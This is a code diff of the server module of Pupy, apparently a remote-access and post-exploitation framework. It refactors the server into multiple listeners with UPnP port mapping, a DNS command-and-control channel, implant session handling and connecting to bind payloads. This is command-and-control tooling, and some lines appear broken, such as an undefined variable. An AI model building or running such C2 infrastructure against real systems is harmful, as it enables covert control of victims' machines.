@@ -14,7 +14,7 @@
 # THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
 # --------------------------------------------------------------
 
-import threading
+from threading import Thread, Event, Lock
 from . import PupyService
 import pkgutil
 import modules
@@ -27,6 +27,7 @@ from .PupyService import PupyBindService
 from network.conf import transports
 from network.lib.connection import PupyConnectionThread
 from pupylib.utils.rpyc_utils import obtain
+from pupylib.utils.network import get_listener_ip_with_local
 from pupylib.PupyDnsCnc import PupyDnsCnc
 from .PupyTriggers import on_connect
 from network.lib.utils import parse_transports_args
@@ -34,60 +35,247 @@ from network.lib.base import chain_transports
 from network.lib.transports.httpwrap import PupyHTTPWrapperServer
 from network.lib.base_launcher import LauncherError
 from network.lib.igd import IGDClient, UPNPError
+from network.lib.streams.PupySocketStream import PupyChannel
 from .PupyWeb import PupyWebServer
 from os import path
 from shutil import copyfile
 from itertools import count, ifilterfalse
+from netaddr import IPAddress
+from random import randint
 import marshal
 import network.conf
 import rpyc
 import shlex
 import socket
 import errno
-from . import PupyClient
+
+from .PupyClient import PupyClient
+
 import os.path
 
-class PupyServer(threading.Thread):
-    def __init__(self, config, credentials):
-        super(PupyServer, self).__init__()
+class ListenerException(Exception):
+    pass
+
+class Listener(Thread):
+    def __init__(self, pupsrv, name, args, httpd=False, igd=False, local=None, external=None):
+        Thread.__init__(self)
         self.daemon = True
+
+        self.name = name.lower().strip()
+        self.transport = transports[self.name]()
         self.server = None
-        self.authenticator = None
+        self.authenticator = self.transport.authenticator() if \
+          self.transport.authenticator else None
+
+        self.pupsrv = pupsrv
+        self.httpd = httpd
+        self.igd = igd
+
+        # Where to connect
+        self.external = external
+        self.external_port = None
+
+        # Where to bind
+        self.address = local or ''
+        self.igd_mapping = False
+
+        # Is where to connect placed at our PC
+        self.local = True
+
+        if httpd and not self.transport.dgram:
+            self.transport.server_transport = chain_transports(
+                PupyHTTPWrapperServer.custom(server=self),
+                t.server_transport
+            )
+
+        if args:
+            args = [ x.strip() for x in args.split(' ', 1) if x ]
+        else:
+            args = []
+
+        if not args:
+            self.port = randint(20000, 50000)
+            self.ipv6 = False
+        else:
+            if ':' in args[0]:
+                ip, port = args[0].rsplit(':', 1)
+                try:
+                    if '=' in ip:
+                        extip, ip = ip.split('=', 1)
+                    else:
+                        extip = None
+
+                    address = IPAddress(ip)
+                    self.address = str(address)
+
+                    if extip:
+                        if extip in ('?', 'igd'):
+                            self.external = extip
+                        else:
+                            self.external = str(IPAddress(extip))
+
+                    elif self.address:
+                        self.external = self.address
+
+                    self.ipv6 = address.version == 6
+                except Exception, e:
+                    raise ListenerException('Invalid IP: {} ({})'.format(ip, e))
+
+            else:
+                port = args[0]
+                self.ipv6 = False
+
+        if not self.external or self.external in ('?', 'igd') :
+            # If IGD enabled then we likely want to have mappings
+            # Why to have mappings if our external IP remains empty?
+            if self.igd and self.igd.available:
+                extip, self.local = get_listener_ip_with_local(
+                    external=True,
+                    config=pupsrv.config,
+                    igd=self.igd
+                )
+
+                self.external = str(IPAddress(extip))
+            elif self.address and not self.address in ('0.0.0.0', '::'):
+                self.external = self.address
+            else:
+                extip, self.local = get_listener_ip_with_local(
+                    config=pupsrv.config,
+                    igd=self.igd
+                )
+
+                try:
+                    self.external = str(IPAddress(extip))
+                except:
+                    self.external = '127.0.0.1'
+
+        if '=' in port:
+            port = [ x.strip() for x in port.split('=', 1) ]
+            try:
+                self.external_port = int(port[0])
+            except:
+                raise ListenerException("Invalid external port: {}".format(port[0]))
+
+            try:
+                self.port = int(port[1])
+            except:
+                raise ListenerException("Invalid local port: {}".format(port[1]))
+        else:
+            try:
+                self.port = int(port)
+            except:
+                raise ListenerException("Invalid local port: {}".format(port[1]))
+
+            self.external_port = self.port
+
+        if self.local:
+            self.external_port = self.port
+
+        transport_kwargs = self.transport.server_transport_kwargs
+
+        if len(args) > 1:
+            opt_args = parse_transports_args(args[1])
+        else:
+            opt_args = []
+
+        for val in opt_args:
+            val = val.lower()
+            if val in t.server_transport_kwargs:
+                transport_kwargs[val] = opt_args[val]
+            else:
+                logging.warning('Unknown transport argument: {}'.format(val))
+
+        self.kwargs = transport_kwargs
+
+        try:
+            self.transport.parse_args(self.kwargs)
+        except Exception, e:
+            logging.exception(e)
+
+    def init(self):
+        self.server = self.transport.server(
+            PupyService,
+            port=self.port, hostname=self.address,
+            authenticator=self.authenticator,
+            stream=self.transport.stream,
+            transport=self.transport.server_transport,
+            transport_kwargs=self.transport.server_transport_kwargs,
+            pupy_srv=self.pupsrv,
+            ipv6=self.ipv6,
+            igd=self.igd,
+            external=self.external,
+            external_port=self.external_port
+        )
+
+    def run(self):
+        self.server.start()
+
+    def close(self):
+        if self.igd and self.igd_mapping:
+            try:
+                self.igd.DeletePortMapping(
+                    self.external_port, self.port)
+            except UPNPError as e:
+                logging.error(
+                    "Couldn't delete IGD Mapping: {}".format(e.description)
+                )
+            except:
+                pass
+
+        if self.server:
+            self.server.close()
+
+    def __del__(self):
+        self.close()
+
+    def __str__(self):
+        result = str(self.port)
+        if self.address:
+            result = '{}:{}'.format(
+                self.address if not self.ipv6 else '[{}]'.format(self.address),
+                self.port
+            )
+
+        if self.external and not self.local and self.external != self.address:
+            if not self.address:
+                result = '0.0.0.0:{}'.format(result)
+
+            result = 'Remote: {}:{} -> Local: {}'.format(
+                self.external, self.external_port, result
+            )
+
+        if self.kwargs:
+            result += ' ' + str(self.args)
+
+        return '{}: {}'.format(self.name, result)
+
+
+class PupyServer(object):
+    def __init__(self, config, credentials):
         self.httpd = None
         self.pupweb = None
         self.clients = []
         self.jobs = {}
         self.jobs_id = 1
-        self.clients_lock = threading.Lock()
+        self.clients_lock = Lock()
         self._current_id = []
-        self._current_id_lock = threading.Lock()
+        self._current_id_lock = Lock()
+
+        self.motd = {
+            'fail': [],
+            'ok': []
+        }
 
         self.config = config or PupyConfig()
         self.credentials = credentials or PupyCredentials()
 
-        self.port = self.config.getint('pupyd', 'port')
-        self.address = self.config.getip('pupyd', 'address') or ''
-
-        if self.address:
-            self.ipv6 = self.address.version == 6
-            self.address = str(self.address)
-        else:
-            self.ipv6 = self.config.getboolean('pupyd', 'ipv6')
-
-        transport_args = self.config.get('pupyd', 'transport_args')
-        if transport_args:
-            transport_args = [ x.strip() for x in transport_args.split(' ', 1) if x ]
-        else:
-            transport_args = []
-
-        self.transport = self.config.get('pupyd', 'transport')
-        self.transport_kwargs = transport_args[1] if len(transport_args) > 1 else None
-
+        self.ipv6 = self.config.getboolean('pupyd', 'ipv6')
         self.handler = None
-        self.handler_registered = threading.Event()
+        self.handler_registered = Event()
         self.categories = PupyCategories(self)
         self.igd = None
-        self.finished = threading.Event()
+        self.finished = Event()
+        self.finishing = Event()
         self._cleanups = []
         self._singles = {}
 
@@ -103,6 +291,8 @@ class PupyServer(threading.Thread):
 
         self.dnscnc = None
 
+        self._listeners = None
+
         dnscnc = self.config.get('pupyd', 'dnscnc')
         if dnscnc and not dnscnc.lower() in ('no', 'false', 'stop', 'n', 'disable'):
             if ':' in dnscnc:
@@ -115,10 +305,55 @@ class PupyServer(threading.Thread):
                 self.dnscnc = PupyDnsCnc(
                     igd=self.igd,
                     config=self.config,
-                    credentials=self.credentials
+                    credentials=self.credentials,
+                    listeners=self.get_listeners,
+                    cmdhandler=self.handler
                 )
             except Exception, e:
                 logging.error('DnsCNC failed: {}'.format(e))
+
+
+    @property
+    def listeners(self):
+        return self.get_listeners()
+
+    def get_listeners(self):
+        if not self._listeners is None:
+            return self._listeners
+
+        listeners = set([
+            x.strip() for x in (
+                self.config.get('pupyd', 'listen') or 'ssl'
+            ).split(',')
+        ])
+
+        self._listeners = {
+            name:Listener(
+                self,
+                name,
+                self.config.get('listeners', name) or '',
+                httpd=self.httpd,
+                igd=self.igd,
+                local=self.config.get('pupyd', 'address'),
+                external=self.config.get('pupyd', 'external')
+            ) for name in listeners
+        }
+        return self._listeners
+
+    @property
+    def address(self):
+        # Address of default listener
+        for listener in self.listeners.values():
+            if listener and listener.address:
+                return listener.address
+
+        return ''
+
+    @property
+    def port(self):
+        # Port of default listener
+        for listener in self.listeners.values():
+            return listener.port
 
     def start_webserver(self):
         if not self.config.getboolean('pupyd', 'webserver'):
@@ -175,6 +410,7 @@ class PupyServer(threading.Thread):
     def register_handler(self, instance):
         """ register the handler instance, typically a PupyCmd, and PupyWeb in the futur"""
         self.handler=instance
+        self.dnscnc.cmdhandler=instance
         self.handler_registered.set()
 
     def add_client(self, conn):
@@ -200,6 +436,7 @@ class PupyServer(threading.Thread):
                     "native": bool(conn.get_infos("native")),
                     "sid": conn.get_infos("sid") or '',
                 }
+
             address=conn._conn._config['connid']
             try:
                 if type(address) is list:
@@ -216,7 +453,7 @@ class PupyServer(threading.Thread):
 
             client_info.update(conn.namespace["get_uuid"]())
 
-            pc=PupyClient.PupyClient(client_info, self)
+            pc = PupyClient(client_info, self)
             self.clients.append(pc)
             if self.handler:
                 addr = conn.modules['pupy'].get_connect_back_host()
@@ -225,12 +462,15 @@ class PupyServer(threading.Thread):
                 except:
                     client_ip, client_port = "0.0.0.0", 0 # TODO for bind payloads
 
-                self.handler.display_srvinfo("Session {} opened ({}@{}) ({}{}:{})".format(
+                remote = ' ({}{}:{})'.format(
+                    '{} <- '.format(addr) if not '0.0.0.0' in addr else '',
+                    client_ip, client_port)
+
+                self.handler.display_srvinfo("Session {} opened ({}@{}){}".format(
                     client_id,
                     client_info.get('user','?'),
                     client_info.get('hostname','?'),
-                    '{} <- '.format(addr) if not '0.0.0.0' in addr else '',
-                    client_ip, client_port)
+                    remote if client_port != 0 else '')
                 )
         if pc:
             on_connect(pc)
@@ -353,7 +593,10 @@ class PupyServer(threading.Thread):
         return l
 
     def get_module(self, name):
-        module=pkgutil.get_loader("modules."+name).load_module(name)
+        loader = pkgutil.get_loader('modules.'+name)
+        if not loader:
+            raise ValueError('No such module')
+        module = loader.load_module(name)
         class_name=None
         if hasattr(module,"__class_name__"):
             class_name=module.__class_name__
@@ -395,7 +638,10 @@ class PupyServer(threading.Thread):
 
     def connect_on_client(self, launcher_args):
         """ connect on a client that would be running a bind payload """
-        launcher=network.conf.launchers["connect"](connect_on_bind_payload=True)
+        launcher=network.conf.launchers['connect'](
+            connect_on_bind_payload=True
+        )
+
         try:
             launcher.parse_args(shlex.split(launcher_args))
         except LauncherError as e:
@@ -408,66 +654,53 @@ class PupyServer(threading.Thread):
             self.handler.display_error("Couldn't connect to pupy: {}".format(e))
             return
 
-        self.handler.display_success("Connected. Starting session")
+        host = launcher.args.host[0] \
+          if type(launcher.args.host) in (list,tuple) else launcher.args.host
+
+        self.handler.display_success('Starting session ({})'.format(host))
+
         bgsrv=PupyConnectionThread(
             self,
             PupyBindService,
-            rpyc.Channel(stream),
+            PupyChannel(stream),
+            ping=stream.KEEP_ALIVE_REQUIRED,
             config={
-                'connid': launcher.args.host
+                'connid': host
             })
         bgsrv.start()
 
-    def run(self):
+    def start(self):
         self.handler_registered.wait()
-        t = transports[self.transport]()
+        for name in self.listeners.keys():
+            listener = self.listeners[name]
+            try:
+                listener.init()
+                listener.start()
+                self.motd['ok'].append('Listen: {}'.format(listener))
 
-        if self.httpd:
-            t.server_transport = chain_transports(
-                PupyHTTPWrapperServer.custom(server=self),
-                t.server_transport
-            )
-
-        transport_kwargs=t.server_transport_kwargs
-        if self.transport_kwargs:
-            opt_args=parse_transports_args(self.transport_kwargs)
-            for val in opt_args:
-                if val.lower() in t.server_transport_kwargs:
-                    transport_kwargs[val.lower()]=opt_args[val]
+            except socket.error as e:
+                if e.errno == errno.EACCES:
+                    self.motd['fail'].append(
+                        'Listen: {}: Insufficient privileges to bind'.format(listener))
+                elif e.errno == errno.EADDRINUSE:
+                    self.motd['fail'].append(
+                        'Listen: {}: Address/Port already used'.format(listener))
+                elif e.errno == errno.EADDRNOTAVAIL:
+                    self.motd['fail'].append(
+                        'Listen: {}: No network interface with addresss {}'.format(
+                            listener, listener.address))
                 else:
-                    logging.warning("unknown transport argument : %s"%val)
-        if t.authenticator:
-            authenticator=t.authenticator()
-        else:
-            authenticator=None
-        try:
-            t.parse_args(transport_kwargs)
-        except Exception as e:
-            logging.exception(e)
+                    self.motd['fail'].append(
+                        'Listen: {}: {}'.format(listener, e))
 
-        try:
-            self.server = t.server(
-                PupyService,
-                port=self.port, hostname=self.address,
-                authenticator=authenticator,
-                stream=t.stream,
-                transport=t.server_transport,
-                transport_kwargs=t.server_transport_kwargs,
-                pupy_srv=self,
-                ipv6=self.ipv6,
-                igd=self.igd
-            )
+                del self.listeners[name]
 
-            self.server.start()
-        except socket.error as e:
-            if e.errno == errno.EACCES:
-                logging.error('Insufficient privileges to bind on port {}'.format(self.port))
-            else:
+            except Exception as e:
+                self.motd['fail'].append('{}: {}'.format(listener, e))
+                del self.listeners[name]
                 logging.exception(e)
-        except Exception as e:
-            logging.exception(e)
-        finally:
-            self.finished.set()
+
+        self.handler.add_motd(self.motd)
 
     def register_cleanup(self, cleanup):
         self._cleanups.append(cleanup)
@@ -481,12 +714,19 @@ class PupyServer(threading.Thread):
         return single
 
     def stop(self):
+        if self.finishing.is_set():
+            return
+        else:
+            self.finishing.set()
+
         for cleanup in self._cleanups:
             cleanup()
 
         self._cleanups = []
 
-        if self.server:
-            self.server.close()
+        for name, listener in self.listeners.iteritems():
+            listener.close()
+            self.handler.display_success('{} - stopped'.format(name))
+
 
         self.finished.set()
